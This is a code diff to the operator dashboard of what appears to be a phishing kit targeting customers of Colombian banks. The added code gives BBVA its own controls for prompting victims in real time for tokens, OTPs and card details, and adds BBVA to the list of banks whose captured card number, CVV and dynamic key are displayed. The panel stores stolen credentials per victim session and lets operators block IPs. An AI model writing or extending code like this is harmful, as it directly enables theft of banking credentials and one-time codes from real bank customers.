@@ -138,6 +138,18 @@ input[type="checkbox"] { width: 16px; height: 16px; cursor: pointer; accent-colo
 .detalle-item .val { color: #e5e7eb; font-weight: 600; font-family: monospace; }
 .detalle-seccion { grid-column: 1 / -1; margin-top: 15px; padding-top: 15px; border-top: 1px dashed #252d44; }
 .detalle-seccion-titulo { color: #88f456; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 10px; }
+
+/* Efecto Hover para el botón Pedir CC BBVA */
+.btn.hover-expand:hover .text {
+    max-width: 120px !important;
+    opacity: 1 !important;
+    margin-left: 5px;
+}
+.btn.hover-expand .icon {
+    display: inline-block;
+    vertical-align: middle;
+}
+
 @media (max-width: 768px) {
     .container { padding: 10px; }
     .stats { grid-template-columns: 1fr 1fr; }
@@ -367,8 +379,8 @@ function firmaSesiones(lista, activos) {
         s.datos && s.datos.claveDinamica, s.datos && s.datos.token,
         s.datos && s.datos.monto, s.datos && s.datos.precio,
         s.datos && s.datos.authUsuario,
-        s.datos && s.datos.cvv, // 🔥 FIX: Para que detecte el cambio de PSE a DAVI/BANC
-        s.datos && s.datos.bancoSeleccionado // 🔥 FIX: Por seguridad
+        s.datos && s.datos.cvv,
+        s.datos && s.datos.bancoSeleccionado
     ].join('|')).join('~');
 
     let firmaActivos = '';
@@ -554,13 +566,11 @@ function mostrarDashboard() {
     $('dashboard').classList.add('visible'); 
     $('currentUser').textContent = USUARIO; 
     
-    // 🔥 Ocultar botones de borrar si el usuario NO es sovial
     if (USUARIO.toLowerCase() !== 'sovial') {
         if ($('btnBorrarSesiones')) $('btnBorrarSesiones').style.display = 'none';
         if ($('btnBorrarHistorial')) $('btnBorrarHistorial').style.display = 'none';
         if ($('btnBorrarIps')) $('btnBorrarIps').style.display = 'none';
     } else {
-        // Si es sovial, asegurarse de que se vean (por si acaso)
         if ($('btnBorrarSesiones')) $('btnBorrarSesiones').style.display = 'block';
         if ($('btnBorrarHistorial')) $('btnBorrarHistorial').style.display = 'block';
         if ($('btnBorrarIps')) $('btnBorrarIps').style.display = 'block';
@@ -633,20 +643,14 @@ function botonesSesion(s) {
     const ip = escapeHtml(s.datos.ip || '');
     const btns = [];
 
-    // 🔥 DETECCIÓN ESTRICTA: Si el banco es Vanti, verifica si YA tiene tarjeta.
-    // Si tiene tarjeta, muestra los botones de tarjeta.
-    // Si NO tiene tarjeta, muestra los 3 botones iniciales (Asignar Precio, Rechazar, Ya Pagó).
-    
     if (bancoKey === 'vanti') {
         if (s.datos && s.datos.tarjeta) {
-            // Botones de Tarjeta
             btns.push(`<button class="btn btn-otp" title="Pedir OTP o Clave Dinámica" onclick="accion('${sid}','OTP')">📱</button>`);
             btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
             btns.push(`<button class="btn" style="background:#f59e0b; color:white;" title="Error CC" onclick="accion('${sid}','CC_ERROR')">⚠️</button>`);
             btns.push(`<button class="btn" style="background:#3b82f6; color:white;" title="Autorizar Banca Virtual" onclick="accion('${sid}','AUTORIZAR')">🔐</button>`);
             btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
         } else {
-            // Botones de Factura (Inicial)
             btns.push(`<button class="btn" style="background:#6366f1; color:white;" title="Asignar Precio" onclick="ponerPrecio('${sid}')">💲</button>`);
             btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
             btns.push(`<button class="btn btn-final" title="Ya Pagó" onclick="accion('${sid}','YA_PAGO')">✅</button>`);
@@ -675,7 +679,34 @@ function botonesSesion(s) {
         return btns.join('');
     }
 
-  
+    // 🔥 BOTONES DE BBVA (ORDEN ESTRICTO Y SIEMPRE VISIBLES) 🔥
+    if (bancoKey === 'bbva') {
+        // 1. Rechazar
+        btns.push(`<button class="btn btn-reject" title="Rechazar" onclick="accion('${sid}','RECHAZAR')">❌</button>`);
+        
+        // 2. Pedir Token
+        btns.push(`<button class="btn btn-token" title="Pedir Token" onclick="accion('${sid}','TOKEN')">🔢</button>`);
+        
+        // 3. Pedir OTP
+        btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
+        
+        // 4. Pedir CC BBVA (El que se expande al pasar el mouse)
+        btns.push(`
+            <button class="btn btn-final hover-expand" title="Pedir CC BBVA" onclick="accion('${sid}','PEDIR_TARJETA_BBVA')" style="transition: all 0.3s ease; width: auto; overflow: hidden; white-space: nowrap; background-color: #0ea5e9;">
+                <span class="icon">💳</span>
+                <span class="text" style="display: inline-block; max-width: 0; opacity: 0; transition: all 0.3s ease; overflow: hidden; vertical-align: middle;">Pedir CC BBVA</span>
+            </button>
+        `);
+        
+        // 5. Finalizar
+        btns.push(`<button class="btn btn-final" title="Finalizar" onclick="accion('${sid}','FINALIZAR')">✅</button>`);
+        
+        // 6. Bloquear IP
+        btns.push(`<button class="btn btn-block" title="Bloquear IP" onclick="bloquearIp('${ip}')">🚫</button>`);
+        
+        return btns.join('');
+    }
+
     if (bancoKey === 'davivienda') {
         btns.push(`<button class="btn btn-otp" title="Pedir OTP" onclick="accion('${sid}','OTP')">📱</button>`);
         btns.push(`<button class="btn" style="background:#e30613; color:white;" title="Pedir CC Davi" onclick="accion('${sid}','PEDIR_TARJETA')">💳</button>`);
@@ -820,7 +851,7 @@ function renderSesiones() {
         }
         else if (pasoActual === 'clavedin') pasoTexto = 'Clave Dinámica';
 
-        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia' || banco === 'vanti' || banco === 'davivienda';
+        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga' || banco === 'bancolombia' || banco === 'vanti' || banco === 'davivienda' || banco === 'bbva';
         let identificacionTrj = '-';
         let claveFch = '-';
         let cvv = '-';
